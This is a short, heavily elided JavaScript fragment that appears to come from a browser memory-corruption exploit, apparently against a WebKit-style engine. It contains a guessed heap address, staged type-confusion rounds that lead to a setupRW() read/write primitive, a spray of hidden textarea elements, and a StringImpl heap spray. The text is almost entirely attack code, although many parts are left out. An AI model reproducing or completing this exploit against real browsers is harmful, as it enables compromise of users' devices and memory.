...
var guess_htmltextarea_addr = new Int64("0x202714E58");
...
function confuseTargetObjRound2() {
	...
	setTimeout(function(){setupRW();}, 6000);
}
...
function reuseTargetObj() {
	...
	if (g_round == 1) {
		...
		setTimeout(function(){confuseTargetObjRound1();}, 10);
	} else {
		setTimeout(function(){confuseTargetObjRound2();}, 10);
	}
}
...
function sprayHTMLTextArea() {
	...
	element.style.cssText = 'display:block-inline;height:0px;width:1px;visibility:hidden;';
	textarea_div_elem.style.cssText = 'display:block-inline;height:0px;width:1px;visibility:hidden;';
...
function sprayStringImpl(start, end) {
	for (let i = start; i < end; i++) {
		let s = new String("A".repeat(LENGTH_TIMER - LENGTH_STRINGIMPL - 4) + i.toString().padStart(4, "0"));
		g_obj_str[s] = 0x1337;
	}
}
